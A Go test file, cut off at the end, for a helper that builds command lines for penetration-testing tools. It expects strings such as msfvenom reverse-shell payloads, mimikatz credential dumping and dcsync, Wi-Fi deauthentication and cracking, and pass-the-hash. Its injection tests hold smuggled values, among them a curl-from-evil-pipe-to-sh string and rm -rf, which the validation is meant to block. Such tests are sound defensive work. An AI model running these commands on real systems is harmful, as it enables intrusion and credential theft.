package tools

import (
	"errors"
	"strings"
	"testing"
)

func TestCatalogListsAllTools(t *testing.T) {
	c := NewCatalog()
	if got := len(c.Tools()); got < 10 {
		t.Fatalf("catalogo deve ter >= 10 ferramentas, tem %d", got)
	}
}

func TestCatalogUnknownTool(t *testing.T) {
	c := NewCatalog()
	if _, err := c.Generate("inexistente", nil); !errors.Is(err, ErrUnknownTool) {
		t.Fatalf("esperava ErrUnknownTool, obtive %v", err)
	}
}

func TestValidationMissingRequired(t *testing.T) {
	c := NewCatalog()
	_, err := c.Generate("nmap", map[string]string{})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError, obtive %v", err)
	}
}

func TestValidationInvalidSelect(t *testing.T) {
	c := NewCatalog()
	_, err := c.Generate("nmap", map[string]string{
		"targets":  "10.0.0.1",
		"scanType": "modo-invalido",
	})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError para select inválido, obtive %v", err)
	}
}

func TestGenerateNmap(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("nmap", map[string]string{
		"targets":  "10.10.10.0/24",
		"scanType": "syn",
		"ports":    "80,443",
		"output":   "normal",
		"verbose":  "true",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	for _, want := range []string{"nmap", "-sS", "-p 80,443", "-oN scan.txt", "-vv", "10.10.10.0/24"} {
		if !strings.Contains(code, want) {
			t.Errorf("comando %q não contém %q", code, want)
		}
	}
}

func TestGenerateGobusterDir(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("gobuster", map[string]string{
		"mode":       "dir",
		"url":        "https://example.com",
		"wordlist":   "/usr/share/wordlists/dirb/common.txt",
		"extensions": "php,html",
		"threads":    "20",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	for _, want := range []string{"gobuster dir", "-u https://example.com", "-x php,html", "-t 20"} {
		if !strings.Contains(code, want) {
			t.Errorf("comando %q não contém %q", code, want)
		}
	}
}

func TestGenerateMetasploitHandler(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("metasploit", map[string]string{
		"platform": "windows",
		"listener": "reverse_tcp",
		"lhost":    "10.10.14.5",
		"lport":    "4444",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	if len(res.Commands) < 2 {
		t.Fatalf("esperava ao menos 2 comandos (msfvenom + handler), obtive %d", len(res.Commands))
	}
	venom := res.Commands[0].Code
	if !strings.Contains(venom, "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe") {
		t.Errorf("msfvenom inesperado: %q", venom)
	}
	handler := res.Commands[1].Code
	if !strings.Contains(handler, "set LHOST 10.10.14.5") || !strings.Contains(handler, "exploit -j -z") {
		t.Errorf("handler inesperado: %q", handler)
	}
}

func TestGenerateHydraHTTPForm(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("hydra", map[string]string{
		"service":  "http-post-form",
		"target":   "192.168.1.10",
		"login":    "admin",
		"passlist": "/usr/share/wordlists/rockyou.txt",
		"formdata": "/login:username=^USER^&password=^PASS^:Login failed",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "http-post-form") || !strings.Contains(code, "^USER^") {
		t.Errorf("comando http-post-form inesperado: %q", code)
	}
}

func TestGenerateHashcatMask(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("hashcat", map[string]string{
		"hashType": "0",
		"attack":   "3",
		"hashfile": "/tmp/hashes.txt",
		"mask":     "?d?d?d?d?d?d?d?d",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "-m 0 -a 3 /tmp/hashes.txt '?d?d?d?d?d?d?d?d'") {
		t.Errorf("comando hashcat inesperado: %q", code)
	}
}

func TestGenerateAircrackFlow(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("aircrack-ng", map[string]string{
		"iface":    "wlan0",
		"bssid":    "AA:BB:CC:DD:EE:FF",
		"channel":  "6",
		"capture":  "capture",
		"wordlist": "/usr/share/wordlists/rockyou.txt",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	if len(res.Commands) != 4 {
		t.Fatalf("esperava 4 comandos, obtive %d", len(res.Commands))
	}
	if !strings.Contains(res.Commands[0].Code, "airmon-ng start wlan0") {
		t.Errorf("passo 1 inesperado: %q", res.Commands[0].Code)
	}
	if !strings.Contains(res.Commands[2].Code, "aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF") {
		t.Errorf("passo deauth inesperado: %q", res.Commands[2].Code)
	}
	if !strings.Contains(res.Commands[3].Code, "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap") {
		t.Errorf("passo quebra inesperado: %q", res.Commands[3].Code)
	}
}

func TestGenerateTCPDumpFilter(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("tcpdump", map[string]string{
		"iface":  "eth0",
		"host":   "10.10.10.5",
		"port":   "443",
		"output": "captura.pcap",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "tcpdump -i eth0 -w captura.pcap 'host 10.10.10.5 and port 443'") {
		t.Errorf("comando tcpdump inesperado: %q", code)
	}
}

func TestGenerateImpacketPsexec(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("impacket", map[string]string{
		"tool":    "psexec",
		"target":  "192.168.1.20",
		"domain":  "corp",
		"user":    "admin",
		"command": "whoami",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "impacket-psexec corp/admin@192.168.1.20 whoami") {
		t.Errorf("comando psexec inesperado: %q", code)
	}
}

func TestQuotingProtectsSpecialCharacters(t *testing.T) {
	if got := q("user=admin&pass=x"); got != "'user=admin&pass=x'" {
		t.Errorf("esperava aspas simples, obtive %q", got)
	}
	if got := q("10.0.0.1"); got != "10.0.0.1" {
		t.Errorf("não deveria citar valor simples, obtive %q", got)
	}
}

func TestQuotingPreservesTilde(t *testing.T) {
	if got := q("~/wordlists/rockyou.txt"); got != "~/wordlists/rockyou.txt" {
		t.Errorf("tilde não deveria ser quotado (quebra expansão do shell), obtive %q", got)
	}
	if got := q("~/pwn; rm -rf /"); got != "'~/pwn; rm -rf /'" {
		t.Errorf("metacaracteres ainda devem ser quotados, obtive %q", got)
	}
}

func TestGenerateMimikatzLogonPasswords(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("mimikatz", map[string]string{
		"module":  "logonpasswords",
		"elevate": "true",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	for _, want := range []string{`"privilege::debug"`, `"token::elevate"`, `"sekurlsa::logonpasswords"`} {
		if !strings.Contains(code, want) {
			t.Errorf("comando %q não contém %q", code, want)
		}
	}
}

func TestGenerateMimikatzPTHRequiresHash(t *testing.T) {
	c := NewCatalog()
	_, err := c.Generate("mimikatz", map[string]string{
		"module": "pth",
		"user":   "admin",
		"domain": "corp.local",
	})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError para pth sem hash, obtive %v", err)
	}
}

func TestGenerateMimikatzDCSync(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("mimikatz", map[string]string{
		"module": "dcsync",
		"domain": "corp.local",
		"user":   "krbtgt",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "lsadump::dcsync /domain:corp.local /user:krbtgt") {
		t.Errorf("comando dcsync inesperado: %q", code)
	}
}

func TestGenerateCaidoCLI(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("caido", map[string]string{
		"deploy": "cli",
		"port":   "7000",
		"noopen": "true",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "caido-cli --listen 127.0.0.1:7000 --no-open") {
		t.Errorf("comando caido-cli inesperado: %q", code)
	}
}

func TestGenerateCaidoDocker(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("caido", map[string]string{
		"deploy":  "docker",
		"port":    "8080",
		"datadir": "/home/user/caido-data",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "docker run --rm -p 8080:8080") || !strings.Contains(code, "caido/caido:latest") {
		t.Errorf("comando docker inesperado: %q", code)
	}
}

func TestGenerateBloodHoundPython(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("bloodhound", map[string]string{
		"collector": "bloodhound-python",
		"user":      "svc_probe",
		"password":  "Senha123",
		"domain":    "corp.local",
		"ns":        "192.168.1.10",
		"method":    "All",
		"neo4j":     "false",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	if len(res.Commands) != 2 {
		t.Fatalf("esperava 2 comandos (coletor + GUI), obtive %d", len(res.Commands))
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "bloodhound-python -u svc_probe -d corp.local -c All -p Senha123 -ns 192.168.1.10") {
		t.Errorf("comando bloodhound-python inesperado: %q", code)
	}
}

func TestGenerateFluxion(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("fluxion", map[string]string{
		"iface":   "wlan0",
		"attack":  "captive",
		"essid":   "Casa_Wifi",
		"channel": "6",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	if len(res.Commands) != 2 {
		t.Fatalf("esperava 2 comandos (clone + ataque), obtive %d", len(res.Commands))
	}
	code := res.Commands[1].Code
	if !strings.Contains(code, "./fluxion.sh --language pt --attack captive --interface wlan0 --essid Casa_Wifi --channel 6") {
		t.Errorf("comando fluxion inesperado: %q", code)
	}
}

func TestGenerateNikto(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("nikto", map[string]string{
		"url":    "https://192.168.1.10",
		"port":   "8443",
		"ssl":    "true",
		"tuning": "1,2,3",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "nikto -h https://192.168.1.10 -p 8443 -ssl -Tuning 1,2,3") {
		t.Errorf("comando nikto inesperado: %q", code)
	}
}

func TestGenerateSQLMap(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("sqlmap", map[string]string{
		"url":     "http://example.com/item.php?id=1",
		"method":  "get",
		"dbms":    "mysql",
		"level":   "2",
		"risk":    "1",
		"threads": "8",
		"dump":    "true",
		"batch":   "true",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	for _, want := range []string{
		"sqlmap -u 'http://example.com/item.php?id=1'",
		"--dbms=mysql --level 2 --risk 1 --threads 8 --dump --batch",
	} {
		if !strings.Contains(code, want) {
			t.Errorf("comando sqlmap %q não contém %q", code, want)
		}
	}
}

func TestGenerateSQLMapPostRequiresData(t *testing.T) {
	c := NewCatalog()
	_, err := c.Generate("sqlmap", map[string]string{
		"url":    "http://example.com/item.php",
		"method": "post",
		"level":  "1",
		"risk":   "1",
	})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError para POST sem data, obtive %v", err)
	}
}

func TestGenerateHydraRequiresLoginOrUserlist(t *testing.T) {
	c := NewCatalog()
	_, err := c.Generate("hydra", map[string]string{
		"service":  "ssh",
		"target":   "10.0.0.1",
		"passlist": "/tmp/pass.txt",
	})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError para hydra sem usuário, obtive %v", err)
	}
}

func TestGenerateGobusterDNS(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("gobuster", map[string]string{
		"mode":     "dns",
		"url":      "example.com",
		"wordlist": "/usr/share/wordlists/dirb/common.txt",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "gobuster dns -d example.com -w /usr/share/wordlists/dirb/common.txt") {
		t.Errorf("comando gobuster dns inesperado: %q", code)
	}
}

func TestGenerateGobusterVHost(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("gobuster", map[string]string{
		"mode":     "vhost",
		"url":      "http://example.com",
		"wordlist": "/usr/share/wordlists/dirb/common.txt",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "gobuster vhost -u http://example.com -w /usr/share/wordlists/dirb/common.txt") {
		t.Errorf("comando gobuster vhost inesperado: %q", code)
	}
}

func TestGenerateImpacketNetExec(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("impacket", map[string]string{
		"tool":   "netexec",
		"target": "192.168.1.20",
		"domain": "corp",
		"user":   "admin",
		"hash":   "aad3b435b51404eeaad3b435b51404ee",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "nxc smb 192.168.1.20 -u admin -H aad3b435b51404eeaad3b435b51404ee -d corp") {
		t.Errorf("comando netexec inesperado: %q", code)
	}
}

func TestGenerateCaidoDesktop(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("caido", map[string]string{
		"deploy": "desktop",
		"port":   "8080",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	if len(res.Commands) != 2 {
		t.Fatalf("esperava 2 comandos (desktop + teste de proxy), obtive %d", len(res.Commands))
	}
	if res.Commands[0].Code != "caido" {
		t.Errorf("comando desktop inesperado: %q", res.Commands[0].Code)
	}
}

func TestGenerateBloodHoundSharpHound(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("bloodhound", map[string]string{
		"collector": "sharphound",
		"user":      "svc",
		"domain":    "corp.local",
		"method":    "All",
		"neo4j":     "false",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	if len(res.Commands) != 2 {
		t.Fatalf("esperava 2 comandos (collector + GUI), obtive %d", len(res.Commands))
	}
	if !strings.Contains(res.Commands[0].Code, `.\SharpHound.exe -c All`) {
		t.Errorf("comando sharphound inesperado: %q", res.Commands[0].Code)
	}
}

func TestNoCommandInjection(t *testing.T) {
	c := NewCatalog()

	res, err := c.Generate("tcpdump", map[string]string{
		"iface":  "eth0",
		"filter": "; rm -rf /tmp/pwned",
	})
	if err != nil {
		t.Fatalf("tcpdump: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "'; rm -rf /tmp/pwned'") {
		t.Errorf("filtro tcpdump deveria estar quotado para impedir injeção: %q", code)
	}

	res, err = c.Generate("hydra", map[string]string{
		"service":  "ssh",
		"target":   "10.0.0.1; id",
		"login":    "admin",
		"passlist": "/tmp/pass.txt",
	})
	if err != nil {
		t.Fatalf("hydra: %v", err)
	}
	if !strings.Contains(res.Commands[0].Code, "'ssh://10.0.0.1; id'") {
		t.Errorf("alvo hydra deveria estar quotado: %q", res.Commands[0].Code)
	}

	_, err = c.Generate("metasploit", map[string]string{
		"platform": "windows",
		"listener": "reverse_tcp",
		"lhost":    "10.0.0.1; curl http://evil/x.sh | sh",
		"lport":    "4444",
	})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError para LHOST malicioso, obtive %v", err)
	}
}

func TestNewToolsRegistered(t *testing.T) {
	c := NewCatalog()
	want := []string{"ffuf", "msfvenom", "masscan", "beef", "kismet", "xsser", "commix", "sherlock", "holehe", "rdns"}
	for _, id := range want {
		if c.Tool(id) == nil {
			t.Errorf("ferramenta %q não registrada", id)
		}
	}
}

func TestGenerateFFUFDir(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("ffuf", map[string]string{
		"mode":       "dir",
		"url":        "http://example.com/FUZZ",
		"wordlist":   "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
		"extensions": "php,html",
		"threads":    "50",
		"fc":         "200,301",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "ffuf -u http://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e php,html -t 50 -fc 200,301") {
		t.Errorf("comando ffuf dir inesperado: %q", code)
	}
}

func TestGenerateFFUFVHost(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("ffuf", map[string]string{
		"mode":     "vhost",
		"url":      "http://example.com",
		"domain":   "example.com",
		"wordlist": "/usr/share/wordlists/dirb/common.txt",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "-H 'Host: FUZZ.example.com'") {
		t.Errorf("header vhost inesperado: %q", code)
	}
}

func TestGenerateFFUFVHostRequiresDomain(t *testing.T) {
	c := NewCatalog()
	_, err := c.Generate("ffuf", map[string]string{
		"mode":     "vhost",
		"url":      "http://example.com",
		"wordlist": "/usr/share/wordlists/dirb/common.txt",
	})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError para vhost sem domínio, obtive %v", err)
	}
}

func TestGenerateMsfvenom(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("msfvenom", map[string]string{
		"platform": "windows",
		"listener": "reverse_tcp",
		"lhost":    "10.10.14.5",
		"lport":    "4444",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe") {
		t.Errorf("comando msfvenom inesperado: %q", code)
	}
}

func TestGenerateMsfvenomInvalidLHOST(t *testing.T) {
	c := NewCatalog()
	_, err := c.Generate("msfvenom", map[string]string{
		"platform": "linux",
		"listener": "reverse_tcp",
		"lhost":    "10.0.0.1; rm -rf /",
		"lport":    "4444",
	})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError para LHOST malicioso, obtive %v", err)
	}
}

func TestGenerateMasscan(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("masscan", map[string]string{
		"targets": "10.0.0.0/24",
		"ports":   "80,443",
		"rate":    "5000",
		"output":  "normal,xml",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "masscan 10.0.0.0/24 -p 80,443 --rate 5000 -oL masscan.out -oX masscan.xml") {
		t.Errorf("comando masscan inesperado: %q", code)
	}
}

func TestGenerateBeEF(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("beef", map[string]string{
		"install":  "apt",
		"port":     "3000",
		"hookHost": "10.10.14.5",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	if len(res.Commands) != 2 {
		t.Fatalf("esperava 2 comandos (iniciar + testar hook), obtive %d", len(res.Commands))
	}
	if res.Commands[0].Code != "sudo beef-xss" {
		t.Errorf("comando de inicialização inesperado: %q", res.Commands[0].Code)
	}
	if !strings.Contains(res.Commands[1].Code, "curl -s http://10.10.14.5:3000/hook.js") {
		t.Errorf("comando de teste do hook inesperado: %q", res.Commands[1].Code)
	}
}

func TestGenerateBeEFSource(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("beef", map[string]string{
		"install":  "source",
		"port":     "3000",
		"hookHost": "192.168.1.100",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	if !strings.Contains(res.Commands[0].Code, "git clone https://github.com/beefproject/beef") {
		t.Errorf("comando source inesperado: %q", res.Commands[0].Code)
	}
}

func TestGenerateKismet(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("kismet", map[string]string{
		"iface":      "wlan0",
		"channelHop": "false",
		"logtitle":   "lab",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "kismet -c wlan0 --no-channel-hopping -t lab") {
		t.Errorf("comando kismet inesperado: %q", code)
	}
}

func TestGenerateXsser(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("xsser", map[string]string{
		"url":     "http://example.com/search.php?q=",
		"auto":    "true",
		"cookie":  "PHPSESSID=abc",
		"threads": "16",
		"verbose": "true",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "xsser --url 'http://example.com/search.php?q=' --auto -c PHPSESSID=abc -t 16 -v") {
		t.Errorf("comando xsser inesperado: %q", code)
	}
}

func TestGenerateCommix(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("commix", map[string]string{
		"url":         "http://example.com/ping.php?host=1.1.1.1",
		"method":      "get",
		"level":       "2",
		"os":          "unix",
		"batch":       "true",
		"shell":       "true",
		"randomAgent": "true",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	for _, want := range []string{
		"commix --url 'http://example.com/ping.php?host=1.1.1.1'",
		"--level 2 --os unix --batch --os-shell --random-agent",
	} {
		if !strings.Contains(code, want) {
			t.Errorf("comando commix %q não contém %q", code, want)
		}
	}
}

func TestGenerateCommixPostRequiresData(t *testing.T) {
	c := NewCatalog()
	_, err := c.Generate("commix", map[string]string{
		"url":    "http://example.com/ping.php",
		"method": "post",
		"level":  "1",
	})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError para POST sem data, obtive %v", err)
	}
}

func TestGenerateSherlock(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("sherlock", map[string]string{
		"usernames":  "joao.silva,ana",
		"timeout":    "3",
		"printFound": "true",
		"noColor":    "true",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "sherlock --timeout 3 --print-found --no-color joao.silva ana") {
		t.Errorf("comando sherlock inesperado: %q", code)
	}
}

func TestGenerateSherlockRequiresUsername(t *testing.T) {
	c := NewCatalog()
	_, err := c.Generate("sherlock", map[string]string{
		"timeout": "5",
	})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError para sherlock sem usuário, obtive %v", err)
	}
}

func TestGenerateHolehe(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("holehe", map[string]string{
		"email":    "nome@example.com",
		"onlyUsed": "true",
		"noColor":  "true",
		"csv":      "out.csv",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "holehe nome@example.com --only-used --no-color -C out.csv") {
		t.Errorf("comando holehe inesperado: %q", code)
	}
}

func TestGenerateHoleheInvalidEmail(t *testing.T) {
	c := NewCatalog()
	_, err := c.Generate("holehe", map[string]string{
		"email": "sem-arroba; rm -rf /",
	})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError para e-mail inválido, obtive %v", err)
	}
}

func TestGenerateRDNSDig(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("rdns", map[string]string{
		"target":   "10.0.0.1",
		"method":   "dig",
		"resolver": "8.8.8.8",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	if !strings.Contains(res.Commands[0].Code, "dig -x 10.0.0.1 @8.8.8.8") {
		t.Errorf("comando dig inesperado: %q", res.Commands[0].Code)
	}
}

func TestGenerateRDNSDnsrecon(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("rdns", map[string]string{
		"target": "10.0.0.0/24",
		"method": "dnsrecon",
		"output": "rdns.csv",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	if !strings.Contains(res.Commands[0].Code, "dnsrecon -r 10.0.0.0/24 -c rdns.csv") {
		t.Errorf("comando dnsrecon inesperado: %q", res.Commands[0].Code)
	}
}

func TestGenerateRDNSNmap(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("rdns", map[string]string{
		"target": "10.0.0.0/24",
		"method": "nmap",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	if !strings.Contains(res.Commands[0].Code, "nmap -sL 10.0.0.0/24") {
		t.Errorf("comando nmap -sL inesperado: %q", res.Commands[0].Code)
	}
}

func TestNoCommandInjectionNewTools(t *testing.T) {
	c := NewCatalog()

	_, err := c.Generate("msfvenom", map[string]string{
		"platform": "linux",
		"listener": "reverse_tcp",
		"lhost":    "10.0.0.1; touch /tmp/pwned",
		"lport":    "4444",
	})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("msfvenom: esperava ValidationError para LHOST malicioso, obtive %v", err)
	}

	res, err := c.Generate("commix", map[string]string{
		"url":    "http://example.com/ping.php",
		"method": "post",
		"data":   "host=1.1.1.1; id",
	})
	if err != nil {
		t.Fatalf("commix: %v", err)
	}
	if !strings.Contains(res.Commands[0].Code, `--data='host=1.1.1.1; id'`) {
		t.Errorf("commix: data deveria estar quotado para impedir injeção: %q", res.Commands[0].Code)
	}

	_, err = c.Generate("holehe", map[string]string{
		"email": "x@y.com; rm -rf /",
	})
	if !errors.As(err, &ve) {
		t.Fatalf("holehe: esperava ValidationError para e-mail malicioso, obtive %v", err)
	}
}

func TestNetExecTargetIsQuoted(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("impacket", map[string]string{
		"tool":   "netexec",
		"target": "10.0.0.1; echo INJECTED",
		"user":   "admin",
		"hash":   "aad3b435b51404eeaad3b435b51404ee",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if strings.Contains(code, "10.0.0.1; echo INJECTED") && !strings.Contains(code, `'10.0.0.1; echo INJECTED'`) {
		t.Errorf("alvo netexec não está quotado: %q", code)
	}
	if !strings.Contains(code, `nxc smb '10.0.0.1; echo INJECTED'`) {
		t.Errorf("comando netexec inesperado: %q", code)
	}
}

func TestInterfaceRejectsPathLikeInput(t *testing.T) {
	c := NewCatalog()

	bad := []struct {
		tool string
		ans  map[string]string
	}{
		{"aircrack-ng", map[string]string{"iface": "eth0; rm -rf /", "channel": "6", "ssid": "net"}},
		{"fluxion", map[string]string{"iface": "wlan0mon/../../etc", "essid": "net"}},
		{"masscan", map[string]string{"targets": "10.0.0.0/24", "ports": "80,443", "rate": "1000", "iface": "eth0:1"}},
		{"kismet", map[string]string{"iface": "wlan0:mon"}},
		{"tcpdump", map[string]string{"iface": "eth0/../lo"}},
	}
	for _, tc := range bad {
		_, err := c.Generate(tc.tool, tc.ans)
		var ve *ValidationError
		if !errors.As(err, &ve) {
			t.Errorf("%s: esperava ValidationError para interface inválida, obtive %v", tc.tool, err)
		}
	}
}

func TestInterfaceAcceptsValidNames(t *testing.T) {
	c := NewCatalog()
	for _, iface := range []string{"eth0", "wlan0mon", "ens33", "lo0.1", "wifi-5g"} {
		_, err := c.Generate("tcpdump", map[string]string{"iface": iface, "filter": "tcp"})
		if err != nil {
			t.Errorf("tcpdump iface %q: erro inesperado: %v", iface, err)
		}
	}
}

func TestBloodHoundPrefersHashOverPassword(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("bloodhound", map[string]string{
		"collector": "bloodhound-python",
		"user":      "svc",
		"domain":    "corp.local",
		"password":  "P@ssw0rd",
		"hash":      "aad3b435b51404eeaad3b435b51404ee",
		"method":    "All",
		"ns":        "10.0.0.53",
		"neo4j":     "false",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	code := res.Commands[0].Code
	if !strings.Contains(code, "--hashes aad3b435b51404eeaad3b435b51404ee") {
		t.Errorf("esperava --hashes, obtive %q", code)
	}
	if strings.Contains(code, "-p P@ssw0rd") {
		t.Errorf("hash presente deveria substituir a senha: %q", code)
	}
}

func TestBloodHoundUsesPasswordWhenNoHash(t *testing.T) {
	c := NewCatalog()
	res, err := c.Generate("bloodhound", map[string]string{
		"collector": "bloodhound-python",
		"user":      "svc",
		"domain":    "corp.local",
		"password":  "P@ssw0rd",
		"method":    "All",
		"neo4j":     "false",
	})
	if err != nil {
		t.Fatalf("erro: %v", err)
	}
	if !strings.Contains(res.Commands[0].Code, "-p P@ssw0rd") {
		t.Errorf("esperava -p com senha, obtive %q", res.Commands[0].Code)
	}
}

func TestNumberFieldRejectsNonInteger(t *testing.T) {
	c := NewCatalog()
	_, err := c.Generate("beef", map[string]string{
		"install":  "apt",
		"port":     "3000abc",
		"hookHost": "10.0.0.1",
	})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError para porta não inteira, obtive %v", err)
	}
	if ve.ID != "port" {
		t.Errorf("esperava ID 'port', obtive %q", ve.ID)
	}
}

func TestPortRangeValidation(t *testing.T) {
	c := NewCatalog()

	cases := []struct {
		tool string
		ans  map[string]string
	}{
		{"beef", map[string]string{"install": "apt", "port": "0", "hookHost": "10.0.0.1"}},
		{"beef", map[string]string{"install": "apt", "port": "70000", "hookHost": "10.0.0.1"}},
		{"caido", map[string]string{"deploy": "cli", "port": "0"}},
		{"metasploit", map[string]string{"platform": "windows", "listener": "reverse_tcp", "lhost": "10.0.0.1", "lport": "70000"}},
	}
	for _, tc := range cases {
		_, err := c.Generate(tc.tool, tc.ans)
		var ve *ValidationError
		if !errors.As(err, &ve) {
			t.Errorf("%s: esperava ValidationError para porta fora do range, obtive %v", tc.tool, err)
		}
	}
}

func TestValidationErrorCarriesID(t *testing.T) {
	c := NewCatalog()
	_, err := c.Generate("nmap", map[string]string{})
	var ve *ValidationError
	if !errors.As(err, &ve) {
		t.Fatalf("esperava ValidationError, obtive %v", err)
	}
	if ve.ID == "" {
		t.Error("ValidationError deve carregar o ID da pergunta")
	}
}

func TestDefaultsAppliedWhenAnswerEmpty(t *testing.T) {
	c := NewCatalog()

	res, err := c.Generate("impacket", map[string]string{
		"target": "10.0.0.1",
		"user":   "admin",
	})
	if err != nil {
